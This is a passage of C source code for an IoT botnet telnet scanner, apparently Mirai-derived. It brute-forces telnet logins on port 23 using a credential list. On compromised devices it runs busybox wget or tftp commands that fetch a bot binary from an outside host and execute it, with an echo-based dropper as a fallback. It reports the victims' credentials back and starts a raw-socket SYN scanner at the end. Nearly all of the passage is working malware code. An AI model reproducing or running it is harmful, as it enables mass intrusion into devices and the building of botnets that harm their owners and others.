    FD_SET(ptr->fd, &read_set);
    
    ret = select(ptr->fd + 1, &read_set, NULL, NULL, &timeout);
    if(ret < 1)
        return FALSE;

    ret = recv(ptr->fd, ptr->sockbuf, SOCKBUF_SIZE, 0);
    if(ret < 1)
        return FALSE;

    unlock_entry(TABLE_SCAN_INFECT_RESPONSE);
    str = retrieve_entry(TABLE_SCAN_INFECT_RESPONSE);
    ret = util_char_search(ptr->sockbuf, SOCKBUF_SIZE, str, util_strlen(str));
    lock_entry(TABLE_SCAN_INFECT_RESPONSE);

    if(ret != -1)
    {
        return TRUE;
    }
    
    return FALSE;
}

static void set_state(struct scanner_struct_t *ptr, int new_state)
{
    ptr->total_timeout = time(NULL);
    ptr->state = new_state;
}

static void reset_state(struct scanner_struct_t *ptr, int is_complete)
{
    ptr->total_timeout = time(NULL);
    close(ptr->fd);
    ptr->complete = is_complete;
    ptr->state = SETUP_TELNET_CONNECTION;
}

static BOOL determine_infection_method(struct scanner_struct_t *ptr)
{
    if(ptr->sockbuf == NULL)
        return -1;

    int ret = 0;
    int ret2 = 0;
    int ret3 = 0;
    char *wget_response, *tftp_response, *echo_response;
    uint8_t method = 0;

    unlock_entry(TABLE_SCAN_WGET_RESPONSE);
    unlock_entry(TABLE_SCAN_TFTP_RESPONSE);
    unlock_entry(TABLE_SCAN_ECHO_RESPONSE);

    wget_response = retrieve_entry(TABLE_SCAN_WGET_RESPONSE);
    tftp_response = retrieve_entry(TABLE_SCAN_TFTP_RESPONSE);
    echo_response = retrieve_entry(TABLE_SCAN_ECHO_RESPONSE);

    ret = util_char_search(ptr->sockbuf, SOCKBUF_SIZE, wget_response, util_strlen(wget_response));
    ret2 = util_char_search(ptr->sockbuf, SOCKBUF_SIZE, tftp_response, util_strlen(tftp_response));
    ret3 = util_char_search(ptr->sockbuf, SOCKBUF_SIZE, echo_response, util_strlen(echo_response));

    if(ret == -1)
        method = 1;
    else if(ret2 == -1)
        method = 2;
    else if(ret3 == -1)
        method = 0;
    else
        method = -1;

    lock_entry(TABLE_SCAN_WGET_RESPONSE);
    lock_entry(TABLE_SCAN_TFTP_RESPONSE);
    lock_entry(TABLE_SCAN_ECHO_RESPONSE);

    return method;
}

static void check_timeout(struct scanner_struct_t *ptr, uint16_t timeout)
{
    int end_time = time(NULL);
    int current_time = ptr->total_timeout;
    BOOL got_timeout = FALSE;
    BOOL got_task = FALSE;
    uint8_t ret = current_time + timeout < end_time ? TRUE : FALSE;

    if(ret)
    {
        switch(ptr->state)
        {
            case READ_ECHO_DEPLOY_FEEDBACK:
                if(ptr->echo_method == 2)
                {
                    #ifdef DEBUG
                        printf("[telnet scan/%d] Bot deploy failed - %s (echo), giving up\n", ptr->fd, get_victim_host(ptr));
                    #endif
                    got_task = TRUE;
                    reset_state(ptr, 1);
                    break;
                }
                else if(ptr->arm_tries != 1 && util_strstr(ptr->arch, "arm"))
                {
                    ptr->arm_tries++;
                    if(ptr->arm_tries == 1)
                    {
                        ptr->elf_header.arch = 0xA7;
                        ptr->arch = "arm7";
                    }
                    ptr->retr_bin_index = 0;
                    #ifdef DEBUG
                        printf("[telnet scan/%d] ARM deloy failed retrying with another version (%d tries) - %s\n", ptr->fd, ptr->arm_tries, get_victim_host(ptr));
                    #endif
                    got_task = TRUE;
                    reset_state(ptr, 2);
                    break;
                }
                if(ptr->arm_tries == 1)
                {
                    #ifdef DEBUG
                        printf("[telnet scan/%d] Bot deploy failed - %s (echo), ARM tries exceeded\n", ptr->fd, get_victim_host(ptr));
                    #endif
                    got_task = TRUE;
                    reset_state(ptr, 1);
                    break;
                }
                #ifdef DEBUG
                    printf("[telnet scan/%d] Bot deploy failed - %s (echo), falling back to another echo method\n", ptr->fd, get_victim_host(ptr));
                #endif
                ptr->echo_method = 2;
                ptr->retr_bin_index = 0;
                got_task = TRUE;
                set_state(ptr, SUBMIT_ECHO_PAYLOAD);
                break;
            case READ_WGET_TFTP_DEPLOY_FEEDBACK:
                #ifdef DEBUG
                    printf("[telnet scan/%d] Bot deploy failed - %s (wget/tftp)\n", ptr->fd, get_victim_host(ptr));
                #endif
                ptr->method = 0;
                got_task = TRUE;
                reset_state(ptr, 2);
                break;
            default:
                break;
        }

        if(!got_task)
        {
            #ifdef DEBUG
                //printf("[telnet scan/%d] Timeout of (%d seconds) exceeded, Case %d\n", ptr->fd, timeout, ptr->state);
            #endif
            reset_state(ptr, 1);
        }
    }

    return;
}

void telnet_scan_noroot(void)
{
    tel_pid = fork();
    if(tel_pid > 0 || tel_pid == -1)
       return;

    init_rand();

    int max = getdtablesize() - 100;
    int i = 0;
    int max_fds = 0;
    int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    int ret = 0;
    int ret2 = 0;
    int j = 0;
    int err = 0;
    char buf[256], line[512], *retr_line, *buffer, buf2[512];
    int num_of_tmp_dirs = 0;
   	
   	if(cpu_cores == 1)
    {
    	 max_fds = 500;
    }
    else if(cpu_cores > 1)
    {
    	 max_fds = 1000;
    }

    if(max > max_fds)
    {
        max = max_fds;
    }
    max = 1;

    fd_set write_set;
    struct timeval timeout;
    struct retrieve_bin_t *retrbin;
    struct sockaddr_in dest_addr;
    struct scanner_struct_t fds[max];

    socklen_t err_len = 0;

    memset(fds, 0, max * (sizeof(int) + 1));

    for(i = 0; i < max; i++)
    {
        memset(&(fds[i]), 0, sizeof(struct scanner_struct_t));
        fds[i].complete = 1;
        memset(fds[i].sockbuf, 0, SOCKBUF_SIZE);
        fds[i].method = -1;
        fds[i].state = 0;
        fds[i].retr_bin_index = 0;
        fds[i].echo_method = 0;
        fds[i].arch = NULL;
        fds[i].arm_tries = 0;
        fds[i].tries = 0;
    }

    process_all_retrieve_lines();

    create_login_list();
    init_prompts();
    init_logins();

    #ifdef DEBUG
        printf("[telnet scan] Retrieved a maximum of %d credential combos\n", max_credentials);
    #endif

    #ifdef DEBUG
        printf("[telnet scan] TELNET scan initilized with %d fd%s (non-root)\n", max, (max > 1 ? "s" : ""));
    #endif

    while(TRUE)
    {
        for(i = 0; i < max; i++)
        {
            switch(fds[i].state)
            {
                case SETUP_TELNET_CONNECTION:
                {
                    switch(fds[i].complete)
                    {
                        case 1:
                            memset(&(fds[i]), 0, sizeof(struct scanner_struct_t));
                            fds[i].dst_addr = inet_addr("45.50.45.83");
                            //fds[i].dst_addr = get_random_ip();
                            fds[i].login = retrieve_login();
                        	break;
                        case 0:
                            break;
                        default:
                            break;
                    }

                    dest_addr.sin_family = AF_INET;
                    dest_addr.sin_port = htons(23);
                    dest_addr.sin_addr.s_addr = fds[i].dst_addr;

                    if((fds[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        continue;
                    }

                    fcntl(fds[i].fd, F_SETFL, O_NONBLOCK | fcntl(fds[i].fd, F_GETFL, 0));

                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                    {
                        reset_state(&fds[i], 1);
                        continue;
                    }

                    set_state(&fds[i], VALIDATE_CONNECTION_STATUS);
                }
                break;
                case VALIDATE_CONNECTION_STATUS:
                {
                    FD_ZERO(&write_set);
                    FD_SET(fds[i].fd, &write_set);

                    timeout.tv_sec = 0;
                    timeout.tv_usec = 100;

                    ret = select(fds[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(ret == 1)
                    {
                        err = 0;
                        err_len = sizeof(err);

                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        
                        if(err != 0)
                        {
                            reset_state(&fds[i], 1);
                        }
                        else
                        {
                            fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~ O_NONBLOCK));
                            set_state(&fds[i], READ_USERNAME_PROMPT);
                        }
                        continue;
                    }
                    else if(ret == -1)
                    {
                        reset_state(&fds[i], 1);
                        continue;
                    }
                    check_timeout(&fds[i], 5);
                }
                break;
                case READ_USERNAME_PROMPT:
                {
                    if(multiple_read_until(TELNET_LOGIN_PROMPTS, &fds[i]))
                    {
                        if(compare_telnet_prompts(TELNET_FAIL_PROMPTS, &fds[i]))
                        {
                        	#ifdef DEBUG
                                printf("[telnet scan/%d] Failed login prompt - %s\n", fds[i].fd, get_victim_host(&fds[i]));
                            #endif
                            reset_state(&fds[i], 1);
                        }
                        else
                        {
                            #ifdef DEBUG
                                printf("[telnet scan/%d] Found login prompt - %s\n", fds[i].fd, get_victim_host(&fds[i]));
                            #endif
                            if(max_credentials != 10)
                    		{
                    			//util_send(fds[i].fd, "root\r\n");
                    		   	util_send(fds[i].fd, "%s\r\n", fds[i].login->username);
                    		}
                            set_state(&fds[i], READ_PASSWORD_PROMPT);
                        }
                        continue;
                    }
                    check_timeout(&fds[i], 7);
                }
                break;
                case READ_PASSWORD_PROMPT:
                {
                    if(multiple_read_until(TELNET_LOGIN_PROMPTS, &fds[i]))
                    {
                        if(compare_telnet_prompts(TELNET_FAIL_PROMPTS, &fds[i]))
                        {
                            reset_state(&fds[i], 1);
                        }
                        else
                        {
                            #ifdef DEBUG
                                printf("[telnet scan/%d] Found login/password prompt - %s\n", fds[i].fd, get_victim_host(&fds[i]));
                            #endif
                            if(max_credentials != 10)
                    		{
                    			//util_send(fds[i].fd, "vizxv\r\n");
                        		util_send(fds[i].fd, "%s\r\n", fds[i].login->password);
                    		}
                            set_state(&fds[i], READ_FAIL_OR_SUCCESS);
                        }
                        continue;
                    }
                    check_timeout(&fds[i], 7);
                }
                break;
                case READ_FAIL_OR_SUCCESS:
                {
                    if(multiple_read_until(TELNET_FAIL_OR_SUCCESS_PROMPTS, &fds[i]))
                    {
                        if(compare_telnet_prompts(TELNET_FAIL_PROMPTS, &fds[i]))
                        {
                            fds[i].tries++;
                            fds[i].remote_auth_index++;
                            
                            if(fds[i].tries == 10)
                            {
                                #ifdef DEBUG
                                    printf("[telnet scan/%d] Failed telnet attempt - %s (exceeded maximum attempts of %d)\n", fds[i].fd, get_victim_host(&fds[i]), fds[i].tries);
                                #endif
                                reset_state(&fds[i], 1);
                                continue;
                            }
                            #ifdef DEBUG
                                printf("[telnet scan/%d] Failed telnet attempt - %s\n", fds[i].fd, get_victim_host(&fds[i]));
                            #endif
                            reset_state(&fds[i], 0);
                        }
                        else if(compare_telnet_prompts(TELNET_SUCCESS_PROMPTS, &fds[i]))
                        {
                            unlock_entry(TABLE_SCAN_ENABLE);
                    		util_send(fds[i].fd, "%s\r\n", retrieve_entry(TABLE_SCAN_ENABLE));
                    		lock_entry(TABLE_SCAN_ENABLE);
		
                    		unlock_entry(TABLE_SCAN_SYSTEM);
                    		util_send(fds[i].fd, "%s\r\n", retrieve_entry(TABLE_SCAN_SYSTEM));
                    		lock_entry(TABLE_SCAN_SYSTEM);
		
                    		unlock_entry(TABLE_SCAN_SHELL);
                    		util_send(fds[i].fd, "%s\r\n", retrieve_entry(TABLE_SCAN_SHELL));
                    		lock_entry(TABLE_SCAN_SHELL);
		
                    		unlock_entry(TABLE_SCAN_SH);
                    		util_send(fds[i].fd, "%s\r\n", retrieve_entry(TABLE_SCAN_SH));
                    		lock_entry(TABLE_SCAN_SH);
		
                    		if(fds[i].complete == 2)
                    		{
                    			util_send(fds[i].fd, "/bin/busybox DMSNA\r\n");
                    		    set_state(&fds[i], FIND_WRITE_DIR);
                    		}
                    		else
                    		{
                    			unlock_entry(TABLE_SCAN_QUERY);
                    			util_send(fds[i].fd, "%s\r\n", retrieve_entry(TABLE_SCAN_QUERY));
                    			lock_entry(TABLE_SCAN_QUERY);
                    		    set_state(&fds[i], READ_QUERY_RESPONSE);
                    		}
                        }
                        else
                        {
                            reset_state(&fds[i], 1);
                        }
                        continue;
                    }
                    check_timeout(&fds[i], 15);
                }
                break;
                case READ_QUERY_RESPONSE:
                {
                    unlock_entry(TABLE_SCAN_BUSYBOX_RESPONSE);
                    if(single_read_until(&fds[i], retrieve_entry(TABLE_SCAN_BUSYBOX_RESPONSE)))
                    {
                    	lock_entry(TABLE_SCAN_BUSYBOX_RESPONSE);
                        #ifdef DEBUG
                            printf("[telnet scan/%d] Success telnet attempt - %s\n", fds[i].fd, get_victim_host(&fds[i]));
                        #endif
                        memset(fds[i].message, 0, sizeof(fds[i].message));
                        sprintf(fds[i].message, "attempting ---> [%s:23 %s:%s]", get_victim_host(&fds[i]), fds[i].login->username, fds[i].login->password);
                        report_working(fds[i].message);
                        unlock_entry(TABLE_SCAN_DETERMINE_INFECTION);
                   		util_send(fds[i].fd, "%s\r\n", retrieve_entry(TABLE_SCAN_DETERMINE_INFECTION));
                    	lock_entry(TABLE_SCAN_DETERMINE_INFECTION);
                        set_state(&fds[i], READ_INFECT_RESPONSE);
                        continue;
                    }
                    lock_entry(TABLE_SCAN_BUSYBOX_RESPONSE);
                    check_timeout(&fds[i], 10);
                }
                break;
                case READ_INFECT_RESPONSE:
                {
                    if(choose_infection_method(&fds[i], 5))
                    {
                        ret2 = determine_infection_method(&fds[i]);
                        switch(ret2)
                        {
                            case 1:
                                #ifdef DEBUG
                                    printf("[telnet scan/%d] Wget\n", fds[i].fd);
                                #endif
                                fds[i].method = 1;
                                unlock_entry(TABLE_SCAN_CAT_BUSYBOX);
                    			util_send(fds[i].fd, "%s\r\n", retrieve_entry(TABLE_SCAN_CAT_BUSYBOX));
                    			lock_entry(TABLE_SCAN_CAT_BUSYBOX);
                                set_state(&fds[i], READ_ELF_FEEDBACK);
                                break;
                            case 2:
                                #ifdef DEBUG
                                    printf("[telnet scan/%d] Tftp\n", fds[i].fd);
                                #endif
                                fds[i].method = 2;
                                unlock_entry(TABLE_SCAN_CAT_BUSYBOX);
                    			util_send(fds[i].fd, "%s\r\n", retrieve_entry(TABLE_SCAN_CAT_BUSYBOX));
                    			lock_entry(TABLE_SCAN_CAT_BUSYBOX);
                                set_state(&fds[i], READ_ELF_FEEDBACK);
                                break;
                            case 0:
                                #ifdef DEBUG
                                    printf("[telnet scan/%d] Echo\n", fds[i].fd);
                                #endif
                                fds[i].method = 0;
                                unlock_entry(TABLE_SCAN_CAT_BUSYBOX);
                    			util_send(fds[i].fd, "%s\r\n", retrieve_entry(TABLE_SCAN_CAT_BUSYBOX));
                    			lock_entry(TABLE_SCAN_CAT_BUSYBOX);
                                set_state(&fds[i], READ_ELF_FEEDBACK);
                                break;
                            default:
                                #ifdef DEBUG
                                    printf("[telnet scan/%d] Failed to find a suitable infection method, giving up\n", fds[i].fd);
                                #endif
                                reset_state(&fds[i], 1);
                                break;
                        }
                    }
                    check_timeout(&fds[i], 15);
                }
                break;
                case READ_ELF_FEEDBACK:
                {
                    if(single_read_until(&fds[i], "ELF"))
                    {
                        if(extract_elf_data(&fds[i]))
                        {
                            #ifdef DEBUG
                                printf("[telnet scan/%d] ELF header extracted successfully\n", fds[i].fd);
                            #endif
                            reset_state(&fds[i], 2);
                            continue;
                        }
                        
                        #ifdef DEBUG
                            printf("[telnet scan/%d] Failed to extract ELF header\n", fds[i].fd);
                        #endif
                        reset_state(&fds[i], 1);
                        continue;
                    }
                    check_timeout(&fds[i], 15);
                }
                break;
                case FIND_WRITE_DIR:
                {
                    unlock_entry(TABLE_SCAN_MOUNTS_RESPONSE);
                    if(single_read_until(&fds[i], retrieve_entry(TABLE_SCAN_MOUNTS_RESPONSE)))
                    {
                        lock_entry(TABLE_SCAN_MOUNTS_RESPONSE);
                        
                        unlock_entry(TABLE_SCAN_DROPPER_NAME);
                        unlock_entry(TABLE_SCAN_BINARY_NAME);

                        int dir;
                        for(dir = 0; dir < 14; dir++)
                        {
                            util_send(fds[i].fd, "/bin/busybox mkdir %s; >%s.file && cd %s\r\n", tmp_dirs[dir], tmp_dirs[dir], tmp_dirs[dir]);
                            util_send(fds[i].fd, "/bin/busybox rm -rf .file %s %s\r\n", retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_DROPPER_NAME));
                        }

                        if(fds[i].method == 0)
                    	{
                        	util_send(fds[i].fd, "/bin/busybox cp /bin/busybox %s; /bin/busybox cp /bin/busybox %s; >%s; >%s; /bin/busybox chmod 777 %s %s\r\n", retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME));
                    	}
                    	else
                    	{
                        	util_send(fds[i].fd, "/bin/busybox cp /bin/busybox %s; >%s; /bin/busybox chmod 777 %s\r\n", retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME));
                    	}

                    	if(fds[i].method == 1)
                    	{
                        	set_state(&fds[i], SUBMIT_WGET_PAYLOAD);
                    	}
                    	else if(fds[i].method == 2)
                    	{
                        	set_state(&fds[i], SUBMIT_TFTP_PAYLOAD);
                    	}
                    	else
                    	{
                        	set_state(&fds[i], SUBMIT_ECHO_PAYLOAD);
                    	}
                        continue;
                    }
                    lock_entry(TABLE_SCAN_MOUNTS_RESPONSE);
                    check_timeout(&fds[i], 15);
                }
                break;
                case SUBMIT_WGET_PAYLOAD:
                {
                    if(util_strstr(fds[i].arch, "arm"))
                    {
                        for(j = 0; j < 2; j++)
                        {
                            unlock_entry(TABLE_SCAN_BINARY_NAME);
                            //util_send(fds[i].fd, "/bin/busybox wget http://%d.%d.%d.%d:%d/batkek/%s -O -> %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.wget; >%s\r\n", 37,49,224,231, 80, arm_bins[j], retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), arm_bins[j], retrieve_entry(TABLE_SCAN_BINARY_NAME));
                            util_send(fds[i].fd, "/bin/busybox wget http://%s:%d/batkek/%s -O -> %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.wget; >%s\r\n", domain, 80, arm_bins[j], retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), arm_bins[j], retrieve_entry(TABLE_SCAN_BINARY_NAME));
                            lock_entry(TABLE_SCAN_BINARY_NAME);
                            //memset(fds[i].message, 0, sizeof(fds[i].message));
                            //sprintf(fds[i].message, "Downloading %s via wget ---> [%s:23 %s:%s]", arm_bins[j], get_victim_host(&fds[i]), fds[i].login->username, fds[i].login->password);
                            //report_working(fds[i].message, 0);   
                            #ifdef DEBUG
                                printf("[telnet scan/%d] Built payload wget\n", fds[i].fd);
                            #endif
                        }
                        set_state(&fds[i], READ_WGET_TFTP_DEPLOY_FEEDBACK);
                        continue;
                    }
                    unlock_entry(TABLE_SCAN_BINARY_NAME);
                    //util_send(fds[i].fd, "/bin/busybox wget http://%d.%d.%d.%d:%d/batkek/%s -O -> %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.wget; >%s\r\n", 37,49,224,231, 80, fds[i].arch, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), fds[i].arch, retrieve_entry(TABLE_SCAN_BINARY_NAME));
                    util_send(fds[i].fd, "/bin/busybox wget http://%s:%d/batkek/%s -O -> %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.wget; >%s\r\n", domain, 80, fds[i].arch, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), fds[i].arch, retrieve_entry(TABLE_SCAN_BINARY_NAME));
                    lock_entry(TABLE_SCAN_BINARY_NAME);
                    //memset(fds[i].message, 0, sizeof(fds[i].message));
                    //sprintf(fds[i].message, "Downloading %s via wget ---> [%s:23 %s:%s]", fds[i].arch, get_victim_host(&fds[i]), fds[i].login->username, fds[i].login->password);
                    //report_working(fds[i].message, 0);
                    #ifdef DEBUG
                        printf("[telnet scan/%d] Built payload wget\n", fds[i].fd);
                    #endif
                    set_state(&fds[i], READ_WGET_TFTP_DEPLOY_FEEDBACK);
                }
                break;
                case SUBMIT_TFTP_PAYLOAD:
                {
                    if(util_strstr(fds[i].arch, "arm"))
                    {
                        for(j = 0; j < 2; j++)
                        {
                            unlock_entry(TABLE_SCAN_BINARY_NAME);
                            //util_send(fds[i].fd, "/bin/busybox tftp -r %s -l %s -g %d.%d.%d.%d; /bin/busybox chmod 777 %s; ./%s telnet.%s.tftp; >%s\r\n", arm_bins[j], retrieve_entry(TABLE_SCAN_BINARY_NAME), 37,49,224,231, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), arm_bins[j], retrieve_entry(TABLE_SCAN_BINARY_NAME));
                            util_send(fds[i].fd, "/bin/busybox tftp -r %s -l %s -g %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.tftp; >%s\r\n", arm_bins[j], retrieve_entry(TABLE_SCAN_BINARY_NAME), domain, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), arm_bins[j], retrieve_entry(TABLE_SCAN_BINARY_NAME));
                            lock_entry(TABLE_SCAN_BINARY_NAME);
                            #ifdef DEBUG
                                printf("[telnet scan/%d] Built payload tftp\n", fds[i].fd);
                            #endif
                            //memset(fds[i].message, 0, sizeof(fds[i].message));
                            //sprintf(fds[i].message, "Downloading %s via tftp ---> [%s:23 %s:%s]", arm_bins[j], get_victim_host(&fds[i]), fds[i].login->username, fds[i].login->password);
                            //report_working(fds[i].message, 0);
                        }
                        set_state(&fds[i], READ_WGET_TFTP_DEPLOY_FEEDBACK);
                        continue;
                    }
                    unlock_entry(TABLE_SCAN_BINARY_NAME);
                    //util_send(fds[i].fd, "/bin/busybox tftp -r %s -l %s -g %d.%d.%d.%d; /bin/busybox chmod 777 %s; ./%s telnet.%s.tftp; >%s\r\n", fds[i].arch, retrieve_entry(TABLE_SCAN_BINARY_NAME), 37,49,224,231, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), fds[i].arch, retrieve_entry(TABLE_SCAN_BINARY_NAME));
                    util_send(fds[i].fd, "/bin/busybox tftp -r %s -l %s -g %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.tftp; >%s\r\n", fds[i].arch, retrieve_entry(TABLE_SCAN_BINARY_NAME), domain, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), fds[i].arch, retrieve_entry(TABLE_SCAN_BINARY_NAME));
                    lock_entry(TABLE_SCAN_BINARY_NAME);
                    //memset(fds[i].message, 0, sizeof(fds[i].message));
                    //sprintf(fds[i].message, "Downloading %s via tftp ---> [%s:23 %s:%s]", fds[i].arch, get_victim_host(&fds[i]), fds[i].login->username, fds[i].login->password);
                    //report_working(fds[i].message, 0);
                    #ifdef DEBUG
                        printf("[telnet scan/%d] Built payload tftp\n", fds[i].fd);
                    #endif
                    set_state(&fds[i], READ_WGET_TFTP_DEPLOY_FEEDBACK);
                }
                break;
                case SUBMIT_ECHO_PAYLOAD:
                {
                    retrbin = get_retrieve_binary(&fds[i]);
                    if(retrbin == 0)
                    {
                        #ifdef DEBUG
                            printf("[telnet scan/%d] Failed to load retrieve binary - %s\n", fds[i].fd, get_victim_host(&fds[i]));
                        #endif
                        reset_state(&fds[i], 1);
                        continue;
                    }

                    retr_line = get_retrieve_line(retrbin, fds[i].retr_bin_index);
                    if(retr_line == NULL)
                    {
                        reset_state(&fds[i], 1);
                        continue;
                    }

                    unlock_entry(TABLE_SCAN_DROPPER_NAME);

                    if(fds[i].echo_method != 2)
                    {
                        util_send(fds[i].fd, "/bin/busybox echo -en '%s' %s %s && /bin/busybox echo -en '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45'\r\n", retr_line, (fds[i].retr_bin_index == 0 ? ">" : ">>"), retrieve_entry(TABLE_SCAN_DROPPER_NAME));
                    }
                    else
                    {
                        util_send(fds[i].fd, "/bin/busybox echo '%s\\c' %s %s && /bin/busybox echo '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45\\c'\r\n", retr_line, (fds[i].retr_bin_index == 0 ? ">" : ">>"), retrieve_entry(TABLE_SCAN_DROPPER_NAME));
                    }

                    lock_entry(TABLE_SCAN_DROPPER_NAME);

                    #ifdef DEBUG
                        printf("[telnet scan/%d] Built payload echo dropper\n", fds[i].fd);
                    #endif

                    fds[i].retr_bin_index++;

                    if(fds[i].retr_bin_index == retrbin->retr_line_num)
                    {
                        set_state(&fds[i], RUN_ECHO_PAYLOAD);
                        continue;
                    }
                    set_state(&fds[i], READ_ECHO_FEEDBACK);
                }
                break;
                case READ_ECHO_FEEDBACK:
                {
                    unlock_entry(TABLE_SCAN_ECHO_FEEDBACK);
                    if(single_read_until(&fds[i], retrieve_entry(TABLE_SCAN_ECHO_FEEDBACK)))
                    {
                        lock_entry(TABLE_SCAN_ECHO_FEEDBACK);
                        #ifdef DEBUG
                        	printf("[telnet scan/%d] ECHO feedback\n", fds[i].fd);
                    	#endif
                        set_state(&fds[i], SUBMIT_ECHO_PAYLOAD);
                        continue;
                    }
                    lock_entry(TABLE_SCAN_ECHO_FEEDBACK);
                    check_timeout(&fds[i], 10);
                }
                break;
                case RUN_ECHO_PAYLOAD:
                {
                    unlock_entry(TABLE_SCAN_DROPPER_NAME);
                    unlock_entry(TABLE_SCAN_BINARY_NAME);

                    util_send(fds[i].fd, "./%s; ./%s telnet.%s.echo; >%s; >%s\r\n", retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), fds[i].arch, retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME));

                    lock_entry(TABLE_SCAN_DROPPER_NAME);
                    lock_entry(TABLE_SCAN_BINARY_NAME);
                    #ifdef DEBUG
                       	printf("[telnet scan/%d] Built payload echo exec\n", fds[i].fd);
                    #endif
                    //memset(fds[i].message, 0, sizeof(fds[i].message));
                    //sprintf(fds[i].message, "Echo loaded %s ---> [%s:23 %s:%s]", fds[i].arch, get_victim_host(&fds[i]), fds[i].login->username, fds[i].login->password);
                    //report_working(fds[i].message, 0);
                    set_state(&fds[i], READ_ECHO_DEPLOY_FEEDBACK);
                }
                break;
                case READ_ECHO_DEPLOY_FEEDBACK:
                {
                    unlock_entry(TABLE_DEPLOY_STRING);
                    if(single_read_until(&fds[i], retrieve_entry(TABLE_DEPLOY_STRING)))
                    {
                        memset(fds[i].message, 0, sizeof(fds[i].message));
                        sprintf(fds[i].message, "bot %s successfully deployed via echo ---> [%s:23 %s:%s]", fds[i].arch, get_victim_host(&fds[i]), fds[i].login->username, fds[i].login->password);
                        report_working(fds[i].message);
                        #ifdef DEBUG
                            printf("[telnet scan/%d] Bot successfully deployed - %s (echo)\n", fds[i].fd, get_victim_host(&fds[i]));
                        #endif
                        lock_entry(TABLE_DEPLOY_STRING);
                        reset_state(&fds[i], 1);
                        continue;
                    }
                    lock_entry(TABLE_DEPLOY_STRING);
                    check_timeout(&fds[i], 30);
                }
                break;
                case READ_WGET_TFTP_DEPLOY_FEEDBACK:
                {
                    unlock_entry(TABLE_DEPLOY_STRING);
                    if(single_read_until(&fds[i], retrieve_entry(TABLE_DEPLOY_STRING)))
                    {
                        memset(fds[i].message, 0, sizeof(fds[i].message));
                        sprintf(fds[i].message, "bot %s successfully deployed via %s ---> [%s:23 %s:%s]", fds[i].arch, fds[i].method == 1 ? "wget" : "tftp", get_victim_host(&fds[i]), fds[i].login->username, fds[i].login->password);
                        report_working(fds[i].message);
                        #ifdef DEBUG
                            printf("[telnet scan/%d] Bot successfully deployed - %s (wget/tftp)\n", fds[i].fd, get_victim_host(&fds[i]));
                        #endif
                        lock_entry(TABLE_DEPLOY_STRING);
                        reset_state(&fds[i], 1);
                        continue;
                    }
                    lock_entry(TABLE_DEPLOY_STRING);
                    check_timeout(&fds[i], 30);
                }
                break;
            }
        }
    }
}

void telnet_scan_root(void)
{
    int i = 0;
    int x = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;
    //int tmp_dir_size = 0;
    char scan_buf[512];
    char *retr_line;
    struct retrieve_bin_t *retrbin;
    int arm_bin_size = 0;
    #ifndef DEBUG
    tel_pid = fork();
    if(tel_pid > 0 || tel_pid == -1)
        return;
    #endif

    init_rand();

    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof(struct scanner_struct_t));

    for(i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    if((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        exit(0);
    }

    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;

    if(setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_new() & 0xffff;
    }
    while(ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_raw_buf;
    tcph = (struct tcphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_new();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_new() & 0xffff;
